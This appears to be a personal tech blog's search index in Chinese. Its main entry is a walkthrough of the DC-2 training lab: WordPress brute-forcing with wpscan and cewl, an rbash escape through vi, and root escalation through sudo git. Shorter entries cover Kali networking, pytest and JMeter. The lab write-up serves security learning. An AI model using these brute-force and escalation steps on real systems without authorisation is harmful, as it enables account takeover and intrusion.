<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DC-2实战梳理</title>
    <url>/2023/05/04/DC-2%E5%AE%9E%E6%88%98%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<p>涉及知识点</p>
<blockquote>
<ol>
<li>使用 nmap 找寻并扫描靶机。</li>
<li>使用 dirsearch 爆破网站目录。</li>
<li>使用 cewl 制作字典。</li>
<li>使用 wpscan 对 WordPress 站点进行扫描和爆破。</li>
<li>rbash 绕过</li>
<li>sudo 提权</li>
<li>git 提权</li>
<li>修改 hosts 文件来访问网站。</li>
</ol>
</blockquote>
<p><a name="A4Fdn"></a></p>
<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><p><a name="Z5Rqj"></a></p>
<h2 id="1、IP扫描"><a href="#1、IP扫描" class="headerlink" title="1、IP扫描"></a>1、IP扫描</h2><p>法1、fping -g 192.168.221.0&#x2F;24<br />法2、arp-scan -l</p>
<blockquote>
<p> arp-scan  是一个用来进行系统发现的ARP命令行扫描工具（可以发现本地网络中的隐藏设备）它可以构造并发送ARP请求到指定的IP地址<br>可以显示本地网络中的所有连接设备，即使这些设备有防火墙。防火墙设备可以屏蔽ping，但是并不能屏蔽ARP数据包。  </p>
</blockquote>
<p>法3、nmap -sn 192.168.221.0&#x2F;24</p>
<p><a name="cOYIm"></a></p>
<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nmap -T4 -sV -O -A -p- <span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span></span><br><span class="line"><span class="comment">#-T4(速度) </span></span><br><span class="line"><span class="comment"># -sV(版本扫描和开启的服务) </span></span><br><span class="line"><span class="comment"># -O(操作系统) </span></span><br><span class="line"><span class="comment"># -p-（全部端口）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#did not  follow 显示不能跟踪跳转需要设置host</span></span><br></pre></td></tr></table></figure>
<p><a name="Yq4Rp"></a></p>
<h2 id="3、网站目录扫描"><a href="#3、网站目录扫描" class="headerlink" title="3、网站目录扫描"></a>3、网站目录扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 法一：使用dirb</span></span><br><span class="line">dirb http://<span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">dirb http://dc-<span class="number">2</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 法二：使用dirsearch</span></span><br><span class="line">dirsearch -u http://dc-<span class="number">2</span>/ -e * -x <span class="number">403</span> <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -u接网站地址</span></span><br><span class="line">    <span class="comment"># -e后接语言，可选php，asp，*（表示全部语言）等</span></span><br><span class="line">    <span class="comment"># -x表示过滤的状态码，扫描出来后不显示该状态</span></span><br></pre></td></tr></table></figure>
<p><a name="gXRXk"></a></p>
<h2 id="4、网页信息探测"><a href="#4、网页信息探测" class="headerlink" title="4、网页信息探测"></a>4、网页信息探测</h2><blockquote>
<p><em>下载浏览器插件：Wappalyzer–通过 Wappalyzer 可以识别出网站采用了那种 web 技术。它能够检测出 CMS 和电子商务系统、留言板、javascript 框架，主机面板，分析统计工具和其它的一些 web 系统。The company behind Wappalyzer 还能够收集 web 程序的一些信息用于统计分析，揭示出各种 web 系统的使用率即增长情况。实际 Wappalyzer 就是一个指纹识别工具。</em></p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683202962408-73ac3e1b-fe5c-420a-9880-b404c3365c76.png#averageHue=%23cbb398&clientId=u0bcc4f02-dffa-4&from=paste&height=827&id=u8dbf84d7&originHeight=827&originWidth=1310&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=163998&status=done&style=none&taskId=u37de4f1c-897f-4877-a0d7-aa5bf07fee1&title=&width=1310" alt="image.png"></p>
<p><a name="gwmA8"></a></p>
<h1 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h1><p><a name="yKSKv"></a></p>
<h2 id="flag1、flag2"><a href="#flag1、flag2" class="headerlink" title="flag1、flag2"></a>flag1、flag2</h2><p>1、根据第一步信息收集中的目录扫描，找到登录界面；可以看到登陆需要用户名和密码，我们根据Flag找找线索<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683205505930-2aa8438e-9f65-4c0b-948b-bd88cbb2892a.png#averageHue=%23f2f2f2&clientId=u05675e4b-254f-4&from=paste&height=726&id=NSGpU&originHeight=726&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53147&status=done&style=none&taskId=u03827c84-6e51-4a16-ae85-c637da5a9d8&title=&width=1189" alt="image.png"><br />2、根据flag1的内容，提示我们使用cewl制作密码字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将生成的单词列表写入password.txt中</span></span><br><span class="line">cewl http://dc-<span class="number">2</span>/ -w password.txt</span><br></pre></td></tr></table></figure>
<p>2、由于目前只有密码字典，要登陆网站还需要制作用户名字典；该网站是wordpress搭建的，有一个专门对应的漏洞扫描工具–wpscan</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 枚举wordpress站点中注册过的用户名，来制作用户名字典</span></span><br><span class="line">wpscan --url http://dc-<span class="number">2</span>/ -e u</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206126585-c870b5ad-f1ec-480b-84a4-e3b4e704f735.png#averageHue=%23292f3b&clientId=u05675e4b-254f-4&from=paste&height=359&id=u2b950ae4&originHeight=441&originWidth=667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110194&status=done&style=none&taskId=ue0bb74ab-65ec-41e5-b9d9-2e6b3217305&title=&width=543" alt="image.png"><br />3、将上面成功枚举出来的用户名，写入到文件中，作为用户名字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写入user.txt</span></span><br><span class="line">vim user.txt</span><br></pre></td></tr></table></figure>
<p>4、用wpscan调用上面生成的用户名字典和密码字典，对网站进行爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-<span class="number">2</span>/ -U user.txt -P password.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206375271-a11a8a1d-b363-4f78-a544-f17c847ff522.png#averageHue=%23292e39&clientId=u05675e4b-254f-4&from=paste&height=413&id=ue3816cfd&originHeight=496&originWidth=636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125073&status=done&style=none&taskId=u301b860e-b307-4d4e-98f0-9960461af79&title=&width=529" alt="image.png"><br />5、成功爆破出用户，尝试使用爆破出来的账号和密码进行登陆；发现只有jerry账号内有pages栏目，且该栏目下找到了flag2<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206653327-ce093618-ba5b-4475-979e-1e02ca5be02a.png#averageHue=%23e9e5d0&clientId=u05675e4b-254f-4&from=paste&height=758&id=ud57b91b6&originHeight=758&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182377&status=done&style=none&taskId=uc675de68-e6b1-4b15-ab23-a07ce44cfef&title=&width=1447" alt="image.png"><br><a name="aK5yw"></a></p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>ssh登陆服务器，发现只有tom用户能登进去，ls看到有flag3.txt，此时直接vi flag3.txt。提示切换用户</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一、SSH登录到远程靶机</span></span><br><span class="line">ssh -p <span class="number">7744</span> tom@<span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span></span><br><span class="line"><span class="comment"># 二、发现是rbash</span></span><br><span class="line"><span class="comment"># 三、查看可以使用哪些命令</span></span><br><span class="line">echo $PATH</span><br><span class="line">ls &lt;上一个命令输出的路径&gt;</span><br><span class="line"><span class="comment"># 四、用ls查看，发现了flag.txt,直接用vi</span></span><br></pre></td></tr></table></figure>

<p><a name="K8cDq"></a></p>
<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>根据flag3提示切换用户，但当前无法使用su命令，所以尝试用rbash绕过<br><a name="VGomS"></a></p>
<h3 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一、可以使用vi命令，通过设置shell变量的方式实现逃逸</span></span><br><span class="line"><span class="comment">// 1、vi进入文件中</span></span><br><span class="line"><span class="comment">// 2、输入</span></span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 3、回车后输入</span></span><br><span class="line">：shell</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 4、此时成功进入shell</span></span><br><span class="line"><span class="comment">// 即rbash逃逸成功，但此时有些命令还是无法执行，因为现在只是绕过了rbash的限制，用户权限还是普通用户</span></span><br><span class="line"><span class="comment">// 有很多的命令会出现路径异常，可以用echo $PATH查看当前的搜索路径</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 5、先看看我们正常的root权限的PATH是什么值</span></span><br><span class="line">──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># echo $PATH                            </span></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6、将上面的值复制，在目标机上修改</span></span><br><span class="line">PATH=<span class="variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="comment">// 也可以用 </span></span><br><span class="line">export PATH=<span class="variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="comment">// 如果要替换的话用</span></span><br><span class="line">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="ZKTcZ"></a></p>
<h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p>逃逸成功后加上权限，此时可以使用su切换用户</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 切换用户并输入前面暴破出来的密码</span></span><br><span class="line">su jerry</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登陆成功后 进去用户目录,发现flag4.txt,直接cat查看</span></span><br><span class="line">  cd /home/jerry</span><br><span class="line">  ls</span><br></pre></td></tr></table></figure>
<p>flag4提示git提权<br><a name="DMZjG"></a></p>
<h2 id="final-flag"><a href="#final-flag" class="headerlink" title="final-flag"></a>final-flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看当前用户可以以root身份执行的命令</span></span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发现可以执行git命令，所以可以利用git 提权</span></span><br><span class="line">  sudo git help config</span><br><span class="line">  !/bin/bash</span><br><span class="line"><span class="comment">// 此时已经提权成功了，可以用whoami验证下，显示为root</span></span><br><span class="line">  whoami</span><br><span class="line"><span class="comment">// 进入/root/，发现flag.</span></span><br><span class="line">  cd /root</span><br><span class="line">  ls</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683471227451-bcd3b41b-2adb-4ac3-be1e-025331658613.png#averageHue=%23272b39&clientId=u92967187-204d-4&from=paste&height=168&id=udb06f95e&originHeight=168&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44088&status=done&style=none&taskId=ufc5a77ee-6507-4887-99a5-7f3f7367c54&title=&width=664" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683471854013-f8b2d396-cdca-4b10-8f5b-8122b9408ceb.png#averageHue=%23262a36&clientId=u92967187-204d-4&from=paste&height=431&id=ue8d9ce7c&originHeight=431&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98855&status=done&style=none&taskId=u75cdd879-4622-48d2-92da-793e9473983&title=&width=553" alt="image.png"></p>
<p>渗透结束</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware-Kali网络设置</title>
    <url>/2023/05/04/VMware-Kali%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<p>1、桥接模式-适合设置与主机相同网段<br />2、NAT模式-适合设置与主机不同网段——这里我试过设置与主机同网段，但ip一直无法配置成功<br />3、仅主机模式-只与主机通信，不能与外网通信</p>
<p>流程：<br />1、设置虚拟机通信模式<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573064373-06af4029-cd8b-4786-8f4e-02f675492407.png#averageHue=%23f4f4f3&clientId=u8e0517f7-93ec-4&from=paste&height=543&id=u86708d06&originHeight=543&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37032&status=done&style=none&taskId=u3ff15ef4-155d-47b3-8864-eacf8d4bdaa&title=&width=876" alt="image.png"><br />2、查看主机ip dns 网关信息<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573152019-8f183f43-b17d-4451-bcf4-f3c90cabfbd0.png#averageHue=%23e4e3e2&clientId=u8e0517f7-93ec-4&from=paste&height=711&id=u9ee36cf4&originHeight=711&originWidth=1139&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105094&status=done&style=none&taskId=uf6d2b77a-ef92-47bb-b5e7-f0456d50ce4&title=&width=1139" alt="image.png"><br />3、按模式进行更改<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573280114-674a8b3d-ef46-420c-be4f-f8ea2f9375bc.png#averageHue=%23dbe2be&clientId=uee4ee051-da7b-4&from=paste&height=853&id=u2bf3b40b&originHeight=853&originWidth=1462&originalType=binary&ratio=1&rotation=0&showTitle=false&size=201870&status=done&style=none&taskId=uad3ce1bb-6801-457b-a25c-682fc8eda09&title=&width=1462" alt="image.png"><br />4、进入虚拟机内配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573505272-3922ec73-ae55-4e30-a5ab-865a18aac632.png#averageHue=%23242d3b&clientId=uee4ee051-da7b-4&from=paste&height=510&id=u271a5605&originHeight=510&originWidth=650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87335&status=done&style=none&taskId=u899bc6e4-07f1-4b55-9bdc-cb4fa0beb57&title=&width=650" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf  #配置dns </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682575821143-21c9a374-6114-43f1-992c-349315001445.png#averageHue=%23232631&clientId=uee4ee051-da7b-4&from=paste&height=495&id=ude4d5c83&originHeight=495&originWidth=617&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41251&status=done&style=none&taskId=ud10bfba3-ec43-4c4e-b628-ffefb4afcea&title=&width=617" alt="image.png"><br />以上两个文件配置完后，依次执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop NetworkManager   #关闭并设置为开机不启动</span><br><span class="line">systemctl disable NetworkManager		#设置为开机不启动</span><br><span class="line">systemctl restart networking         #重启kali网络服务</span><br><span class="line">ip a          #查看ip是否配置成功</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>conftest.py文件使用</title>
    <url>/2023/05/28/conftest.py%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>一、conftest.py<br />1、confest.py是专门用于存放fixtrue的配置文件，名称固定<br />2、在conftest.py文件中的所有方法在调用时都不需要导包<br />3、conftest.py文件可以有多个，且多个conftest.py文件里面的多个fixtrue可以被一个用例调用<br />可分层管理，<br />二、前后置<br />1、基本的前后置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def setup(self)---用例前执行</span><br><span class="line">def teardown(self)---用例后执行</span><br><span class="line">def setup_class(self)---类前执行</span><br><span class="line">def teardown_class(self)---类后执行</span><br></pre></td></tr></table></figure>
<p>2、fixtrue装饰器-部分前后置（一般配合conftest.py使用，就是写在conftest.py文件中）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@pytes.fixtrue(scope=&#x27;作用域&#x27;，params=&#x27;数据驱动&#x27;,autouse=&#x27;自动执行&#x27;，</span><br><span class="line">               ids=&#x27;数据驱动时重命名参数名&#x27;,name=&#x27;给fixtrue作用的函数重命名&#x27;)</span><br><span class="line">               </span><br><span class="line">       </span><br><span class="line">-------scope参数--------</span><br><span class="line">function 函数之前/后执行</span><br><span class="line">class 类之前/后执行</span><br><span class="line">module 模块之前/后执行 （不太常用）</span><br><span class="line">package/session 回话前/后执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1662633157368-b10644c8-b87f-4dde-b95b-2eac1e034b60.png#averageHue=%23fcfcfb&clientId=ub232078a-ab13-4&from=paste&height=207&id=u2f653244&originHeight=207&originWidth=469&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55155&status=done&style=none&taskId=u96d2d16a-c764-466e-980f-a93b4053370&title=&width=469" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1662633420559-5fc088c6-5151-408c-b459-52741fb1bab3.png#averageHue=%23e2e0db&clientId=ub232078a-ab13-4&from=paste&height=163&id=u95bc3d4e&originHeight=163&originWidth=453&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70946&status=done&style=none&taskId=u30a5de41-20bc-422f-b553-ddecacb06db&title=&width=453" alt="image.png"></p>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>pytest</tag>
      </tags>
  </entry>
  <entry>
    <title>jmeter修改内存配置</title>
    <url>/2023/02/21/jmeter%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>一、场景<br />问题：大数据、高并发压测过程中，出现jmeter卡死<br />显示：java.lang.OutOfMemoryError: Java heap space<br />原因：<a href="https://so.csdn.net/so/search?q=jmeter&spm=1001.2101.3001.7020">jmeter</a>默认内存MaxMetaspaceSize&#x3D;256m，运行<a href="https://so.csdn.net/so/search?q=jmeter&spm=1001.2101.3001.7020">jmeter</a>机器的内存，占用较高，超过了jmeter设置的内存上限，内存溢出。<br />默认大小是不够的，我们可以设置MaxMetaspaceSize&#x3D;1024m 或者2048m </p>
<p>二、修改jmeter内存配置（win）<br />1、查看jmeter安装路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which jmeter</span><br></pre></td></tr></table></figure>
<p>2、<strong>修改&#x2F;apache-jmeter-5.4.3&#x2F;bin&#x2F; 目录下的 jmeter文件</strong><br />2.1 查看电脑内存<br />电脑右键“属性”查看电脑内存</p>
<p>2.2修改jmeter内存配置<br />将jmeter文件（windows修改jmeter.bat文件），下面这一行修改为自己电脑的内存大小（建议修改为1024的倍数 1024&#x3D;1G）</p>
<p>2.3找到jmeter.bat文件，找到<img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1676626836929-f174665d-6429-4990-bac1-1cd6bd47debe.png#averageHue=%23f7f4f2&clientId=ud1b71ffc-04ae-4&from=paste&id=u02a87b75&originHeight=121&originWidth=1138&originalType=url&ratio=1&rotation=0&showTitle=false&size=20221&status=done&style=none&taskId=u52e6954c-64e4-4d6c-889f-72453f8d4e8&title=" alt="image.png"><br />修改最后的数值（如1024）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set HEAP=-Xms1g -Xmx1g -XX:MaxMetaspaceSize=1024m</span><br></pre></td></tr></table></figure>
<p><br /> 2.3确认是否生效<br />cmd输入jconsole.exe<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1676626769782-827a2e44-f65d-435c-8e91-ce11fa158207.png#averageHue=%23d6d4d3&clientId=ud1b71ffc-04ae-4&from=paste&id=ue423a437&originHeight=476&originWidth=892&originalType=url&ratio=1&rotation=0&showTitle=false&size=90594&status=done&style=none&taskId=u167cd436-21e1-4202-9f61-e11a15a43e7&title=" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1676626778968-2a60d117-06d2-4f80-99a9-876efab66f5d.png#averageHue=%23f2f1f0&clientId=ud1b71ffc-04ae-4&from=paste&id=uff90be20&originHeight=521&originWidth=656&originalType=url&ratio=1&rotation=0&showTitle=false&size=137643&status=done&style=none&taskId=u3de09fdf-85ae-40d9-bd67-1df152dbffe&title=" alt="image.png"></p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
      </tags>
  </entry>
  <entry>
    <title>jmeter压测插件</title>
    <url>/2023/07/10/jmeter%E5%8E%8B%E6%B5%8B%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>前提：安装在<a href="https://jmeter-plugins.org/install/Install/">插件管理</a>中下载jpgc–standard set<br>如果没有插件管理，到官网下载jar包后放在lib&#x2F;ext目录下</p>
</blockquote>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1669343023103-d8375293-4f62-46f3-abf3-39ffb0ec45d1.png#averageHue=%233d4144&clientId=uca5deaf1-8454-4&from=paste&height=354&id=ubc75f6c3&originHeight=354&originWidth=533&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38213&status=done&style=none&taskId=u1fafdf64-9e2b-44a4-9800-fba77f671e3&title=&width=533" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1669343410292-3965a336-82b2-4451-a5d4-9fd2d74727f1.png#averageHue=%233e4143&clientId=ua6a74019-8f6f-4&from=paste&height=487&id=u873ea412&originHeight=487&originWidth=547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31327&status=done&style=none&taskId=uc1db2fd9-adc2-4e65-9eeb-de7c81e0be1&title=&width=547" alt="image.png"><br />一、两种配置界面<br />阶梯式加<a href="https://so.csdn.net/so/search?q=%E5%8E%8B%E6%B5%8B&spm=1001.2101.3001.7020">压测</a>试（bzm - Concurrency Thread Group）<br />阶梯式使用场景：<br />该场景主要应用在负载测试里面<strong>，</strong>通过设定一定的<a href="https://so.csdn.net/so/search?q=%E5%B9%B6%E5%8F%91&spm=1001.2101.3001.7020">并发</a>线程数<strong>，</strong>给定加压规则<strong>，</strong>遵循“<strong>缓起步，快结束</strong>”的原则<strong>，</strong>不断地增加并发用户来找到系统的性能瓶颈<strong>，</strong>进而有针对性的进行各方面的系统优化；<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1668394174221-b9d9e174-b6f5-4f78-a032-be92213b6ef8.png#averageHue=%236f7376&clientId=u55883303-1c0a-4&from=paste&id=u82d38930&originHeight=864&originWidth=1536&originalType=url&ratio=1&rotation=0&showTitle=false&size=112455&status=done&style=none&taskId=u1a47b082-00ba-4c1d-9abb-35f40ad4599&title=" alt="image.png"><br />与其对应的是进步线程组（jp@gc - Stepping Thread Group），其配置页面如下图所示：该插件<a href="https://so.csdn.net/so/search?q=jmeter&spm=1001.2101.3001.7020">jmeter</a>官方已经不再推荐使用了，所以在进行阶梯压测的时候可以选择 <strong>阶梯式加压测试</strong>（bzm - Concurrency Thread Group）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1668394250182-aa78dadf-be38-450a-9fb7-583b5c214b4c.png#averageHue=%2374787b&clientId=u55883303-1c0a-4&from=paste&id=ud224700b&originHeight=864&originWidth=1536&originalType=url&ratio=1&rotation=0&showTitle=false&size=126015&status=done&style=none&taskId=uf81318f3-cc3a-4a15-a715-237877bdceb&title=" alt="image.png"></p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
      </tags>
  </entry>
  <entry>
    <title>jmeter负载测试中找到最大并发用户数</title>
    <url>/2023/02/23/jmeter%E8%B4%9F%E8%BD%BD%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%89%BE%E5%88%B0%E6%9C%80%E5%A4%A7%E5%B9%B6%E5%8F%91%E7%94%A8%E6%88%B7%E6%95%B0/</url>
    <content><![CDATA[<p><a name="zrgqi"></a></p>
<h4 id="脚本命令行执行："><a href="#脚本命令行执行：" class="headerlink" title="脚本命令行执行："></a>脚本命令行执行：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jmeter -n -t [jmx file] -l [results file] -e -o [Path to web report folder]</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">	[jmx file] 为测试计划文件路径</span><br><span class="line"></span><br><span class="line">	[results file]  为测试结果文件路径</span><br><span class="line"></span><br><span class="line">	[Path to web report folder] 为web报告保存路径。</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1668656386642-307fdb56-37d1-48eb-820d-39bdcede98f8.png#averageHue=%23313233&clientId=uac3beba7-eb78-4&from=paste&height=531&id=ua9844afd&originHeight=531&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=161652&status=done&style=none&taskId=udf5c6b8d-d048-487c-9bc9-85f023b1c00&title=&width=1005" alt="image.png"></p>
<p>在性能测试中，当我们接到项目任务时，很多时候我们是不知道待测接口能支持多少并发用户数的。此时，需要我们先做负载测试，通过逐步加压，来找到最大并发用户数。那么当我们找到一个区间，怎么找到具体的值呢？</p>
<p>在区间中逐步增加步长，出现以下任意现象时，即是最大并发用户数：<br /><strong>1.出现连续报错</strong><br /><strong>2.平均响应时间超过1.5秒（1.5秒是行业标准）</strong><br /><strong>3.tps出现下降趋势</strong></p>
<p>负载测试概念<br />逐步增加并发用户数，找出被测系统的最大可接受的并发用户数，并考察系统性能的变化。</p>
<p>注：并发量过大的时候最好不要添加聚合报告，可能会导致jmeter软件出错</p>
<p><a href="https://blog.csdn.net/begefefsef/article/details/126034230"><br /></a></p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
      </tags>
  </entry>
  <entry>
    <title>kali2022的python2.7没有pip</title>
    <url>/2023/05/04/kali2022%E7%9A%84python2.7%E6%B2%A1%E6%9C%89pip/</url>
    <content><![CDATA[<p>1、进入<a href="https://pypi.org/project/pip/#history">pip</a>下载对应版本，或直接复制下载版本的链接<br />当前kali2022内的python3.10的pip版本是22.3,我下载了这个版本后用python2.7安装，没有用，所以改20.0.1<img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682694772209-153c0f0b-86ce-4c29-9b97-3abd0e2cbae0.png#averageHue=%23242833&clientId=u5b1c6edb-15e4-4&from=paste&height=79&id=uc5c4fe09&originHeight=79&originWidth=569&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12259&status=done&style=none&taskId=u323b4496-ed22-4649-8d1c-ae4794a6d36&title=&width=569" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 切换到python2.7的pip安装目录  </span></span><br><span class="line">cd /usr/lib/python2<span class="number">.7</span>/dist-packages/</span><br><span class="line"><span class="comment">// 下载pip </span></span><br><span class="line">wget https:<span class="comment">//files.pythonhosted.org/packages/28/af/2c76c8aa46ccdf7578b83d97a11a2d1858794d4be4a1610ade0d30182e8b/pip-20.0.1.tar.gz</span></span><br><span class="line"><span class="comment">// 解压</span></span><br><span class="line">tar -xvf pip-<span class="number">20.0</span><span class="number">.1</span>.tar.gz</span><br><span class="line"><span class="comment">// 进入解压目录</span></span><br><span class="line">cd pip-<span class="number">20.0</span><span class="number">.1</span></span><br><span class="line"><span class="comment">// 执行如下</span></span><br><span class="line">python2<span class="number">.7</span> setup.py build</span><br><span class="line">python2<span class="number">.7</span> setup.py install</span><br><span class="line">python2<span class="number">.7</span> -m pip install --upgrade setuptools</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>验证成功<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682695194063-55c4018c-a67e-4403-9c04-39bc0d1fb4ea.png#averageHue=%23292f43&clientId=u5b1c6edb-15e4-4&from=paste&height=99&id=ud86ecb42&originHeight=99&originWidth=634&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19590&status=done&style=none&taskId=u3360d087-3ddb-404e-9204-9a65b3d41b2&title=&width=634" alt="image.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-解压缩命令</title>
    <url>/2022/03/08/linux%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4/</url>
